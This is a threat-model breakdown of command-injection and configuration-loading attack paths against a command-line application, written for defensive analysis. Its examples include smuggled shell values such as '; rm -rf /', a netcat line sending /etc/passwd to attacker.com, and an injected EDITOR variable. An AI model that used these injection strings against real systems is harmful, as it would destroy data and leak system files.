**Detailed Breakdown of Attack Vectors for High-Risk Paths and Critical Nodes:**

**Critical Node: Exploit Argument Parsing Vulnerabilities**

*   This node represents the broad category of attacks that exploit how the application processes command-line arguments provided by the user.
*   Vulnerabilities in argument parsing can allow attackers to inject malicious commands, manipulate file paths, or cause unexpected application behavior.
*   This is a critical node because it serves as the entry point for several high-risk attack paths, particularly those related to command injection.

**Critical Node: Command Injection via Unsanitized Arguments**

*   This node specifically focuses on the vulnerability where user-provided arguments (flags or positional arguments) are used directly in system calls without proper sanitization.
*   Attackers can inject shell metacharacters (like `;`, `|`, `&`, etc.) into these arguments to execute arbitrary commands on the underlying operating system.
*   This is a critical node because successful exploitation leads directly to arbitrary code execution, granting the attacker significant control over the application and potentially the system it runs on.

**High-Risk Path: Inject Shell Metacharacters in Flag Values**

*   Attackers provide malicious input within the value of a command-line flag.
*   Example: `--name "; rm -rf /"` where the application might use the `name` flag value in a system command.
*   If the application doesn't sanitize the flag value, the injected command (`rm -rf /`) will be executed by the shell.

**High-Risk Path: Inject Shell Metacharacters in Positional Arguments**

*   Attackers provide malicious input as one of the positional arguments passed to the application.
*   Example: `my-app "; netcat attacker.com 4444 < /etc/passwd"` where the application might process the positional arguments as part of a command.
*   Similar to flag injection, lack of sanitization allows the injected command to be executed.

**High-Risk Path: Leverage Insecure Use of `os/exec` or Similar**

*   The application directly uses functions like `os/exec.Command` (or similar functions in other languages) with user-provided arguments without proper escaping or parameterization.
*   This allows attackers to control the command being executed by the system.
*   Example: `exec.Command("sh", "-c", userInput)` where `userInput` is directly taken from a command-line argument.

**Critical Node: Exploit Configuration Loading Vulnerabilities**

*   This node encompasses attacks that target the mechanisms used by the application to load its configuration.
*   Vulnerabilities here can allow attackers to inject malicious configuration settings or even execute arbitrary code through the configuration loading process.
*   This is a critical node because it represents a separate attack surface that can lead to significant compromise.

**High-Risk Path: Malicious Configuration File Injection**

*   Attackers aim to provide a malicious configuration file to the application.

    *   **High-Risk Path: If application loads config from a user-specified path:**
        *   The application allows the user to specify the path to the configuration file via a command-line flag or environment variable.
        *   Attackers can provide a path to a crafted configuration file containing malicious commands or settings that will be executed when the application loads the configuration.

**High-Risk Path: Exploit insecure handling of environment variables in command execution**

*   The application uses environment variables in the construction of system commands without proper sanitization.
*   Attackers can set malicious environment variables that will be interpreted as commands or arguments when the application executes a system call.
*   Example: An environment variable `EDITOR` is used in a command like `os.system("$EDITOR file.txt")`. An attacker could set `EDITOR` to `"; malicious_command"`.

**High-Risk Path: Inject commands within subcommand arguments**

*   Similar to command injection in top-level arguments, but this occurs within the context of a subcommand.
*   If a subcommand accepts user input that is then used in system calls without sanitization, attackers can inject malicious commands.
*   Example: `my-app admin user --name "; id"` where the `user` subcommand processes the `--name` argument unsafely.
